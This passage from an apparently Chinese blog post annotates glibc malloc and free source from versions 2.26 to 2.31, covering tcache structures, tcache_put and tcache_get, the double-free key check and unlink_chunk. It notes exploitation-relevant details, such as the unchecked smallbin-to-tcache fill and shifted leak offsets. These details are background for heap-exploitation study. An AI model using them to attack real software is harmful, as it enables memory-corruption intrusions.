class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>smallbin同样新增tcache填充机制,当从smallbin中取出chunk后,如果该smallbinbin中还有剩余chunk,且对应tcache中有剩余空间,则会将smallbin中的chunk移入tcachebin</p><p><strong>注意</strong>填充过程中是没有对smallbin的完整性进行检查的</p><h4 id="大循环-1"><a href="#大循环-1" class="headerlink" title="大循环"></a>大循环</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>增加了一些参数的布置</p><h4 id="unsortedbin遍历"><a href="#unsortedbin遍历" class="headerlink" title="unsortedbin遍历"></a>unsortedbin遍历</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果在遍历时,找到了刚好满足需求的chunk-A时,如果对应tcache中有剩余空间,则将A先放入tcache,如果没有剩余空间则直接返回A</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>每一次unsorted遍历结束后,都会判断是否已经有找到满足需求的chunk,如果有且满足:</p><p>mp<em>.tcache_unsorted_limit大于0,且unsorted已遍历次数大于mp\</em>.tcache_unsorted_limit</p><p>则会直接从tcache中取出chunk中断unsorted遍历并返回</p><p>在调试时发现一般情况下<strong>mp_.tcache_unsorted_limit==0</strong>,也就是上述情况不满足,使得unsorted遍历会正常完成</p><p>然后直到unsorted遍历<strong>完成后</strong>,才会判断是否有找到满足需求的chunk,并从tcache返回</p><h2 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>__libc_free中并没有实质性的变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAYBE_INIT_TCACHE()</span><br></pre></td></tr></table></figure><p>新增判断tcache是否初始化</p><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>释放时<strong><u>优先放入tcachebin</u></strong>,</p><p><strong>优先度高于各种合并</strong>(包括与top_chunk合并)</p><hr><h4 id="fastbin-2"><a href="#fastbin-2" class="headerlink" title="fastbin"></a>fastbin</h4><p>fastbin放入的操作发生了与malloc时类似的变化</p><h2 id="附属-1"><a href="#附属-1" class="headerlink" title="附属"></a>附属</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line"><span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line"><span class="type">int</span> have_fastchunks;</span><br></pre></td></tr></table></figure><p>这样的话unsortedbin泄露地址偏移就需要进行一定调整了,虽然是int类型但因为对齐要求占用了8字节</p><h3 id="malloc-consolidate-1"><a href="#malloc-consolidate-1" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增判断fastbin取出的chunk的大小是否符合当前fastbin链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;  </span><br><span class="line">    ........</span><br><span class="line">    ........</span><br><span class="line">- &#125;</span><br><span class="line">-   <span class="keyword">else</span> &#123;</span><br><span class="line">-     malloc_init_state(av);</span><br><span class="line">-     check_malloc_state(av);</span><br><span class="line">-   &#125;</span><br></pre></td></tr></table></figure><p>去除了一些操作</p><h3 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache结构"><a href="#tcache结构" class="headerlink" title="tcache结构"></a>tcache结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//# define TCACHE_MAX_BINS64</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br></pre></td></tr></table></figure><p><strong>注意:</strong>tcache_entry的next字段指向的是chunk的mem区域,而非malloc_chunk头</p><h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE()"></a>MAYBE_INIT_TCACHE()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init();</span></span><br></pre></td></tr></table></figure><p>判断是否初始化tcache</p><h4 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)<span class="comment">//不适用tcache</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;<span class="comment">//将tcache_perthread_struct的地址赋值给tcache</span></span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先在堆上分配<strong>sizeof (tcache_perthread_struct)+0x10</strong>的chunk,大小一般是64*8+64*2+0x10=<strong>0x290</strong>即每一个counts两个字节(也有可能是64*8+64+0x10=0x250,即每一个counts一个字节,不记得有没有遇到过)</li><li>将其中的<strong>内存全部置零</strong></li></ol><h4 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tcache-shutdown"><a href="#tcache-shutdown" class="headerlink" title="tcache_shutdown"></a>tcache_shutdown</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本不会用到这个函数</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-2"><a href="#libc-malloc-2" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-2"><a href="#int-malloc-2" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><p>无显著变化</p><h2 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h2><h3 id="libc-free-2"><a href="#libc-free-2" class="headerlink" title="__libc_free"></a>__libc_free</h3><p>无显著变化</p><h3 id="int-free-2"><a href="#int-free-2" class="headerlink" title="__int_free"></a>__int_free</h3><h4 id="tcache-2"><a href="#tcache-2" class="headerlink" title="tcache"></a>tcache</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在优先放入tcache时,会判断chunk的key字段是否为<u>tcache</u>,如果是:</p><p>则遍历<strong>该tcache链</strong>中的所有chunk,判断是否存在double free</p><h2 id="附属-2"><a href="#附属-2" class="headerlink" title="附属"></a>附属</h2><h3 id="tcache-3"><a href="#tcache-3" class="headerlink" title="tcache"></a>tcache</h3><h4 id="tcache结构-1"><a href="#tcache结构-1" class="headerlink" title="tcache结构"></a>tcache结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>tcache_entry成员多了个key,用于验证double free</p><h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h4><p><code>e-&gt;key = tcache;</code></p><p>新增一句将key字段赋值为tcache</p><h4 id="tcache-get-1"><a href="#tcache-get-1" class="headerlink" title="tcache_get"></a>tcache_get</h4><p><code>e-&gt;key = NULL;</code></p><p>新增一句将key字段置空</p><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p><strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)<span class="comment">//fd_nextsize为null那么其本身就不在nextsize链</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)<span class="comment">//fd为bin头的时候也不会进入,其实这种情况应该怎么也不会出现的,p在nextsize链上出现,p-&gt;fd任何情况也不会为null,****所以这部分代码的作用应该是防止修改bin头</span></span><br><span class="line"><span class="comment">//前提是确实不会有:在拥有相同大小chunk的情况下去分配nextsize链上的chunk的情况</span></span><br><span class="line">      &#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)<span class="comment">//nextsize链上只有p(其实整个链也只有p)</span></span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<span class="comment">//这样指向不会修改到bin头</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-3"><a href="#libc-malloc-3" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p>无显著变化</p><h3 id="int-malloc-3"><a href="#int-malloc-3" class="headerlink" title="__int_malloc"></a>__int_malloc</h3><h4 id="初始工作-1"><a href="#初始工作-1" class="headerlink" title="初始工作"></a>初始工作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 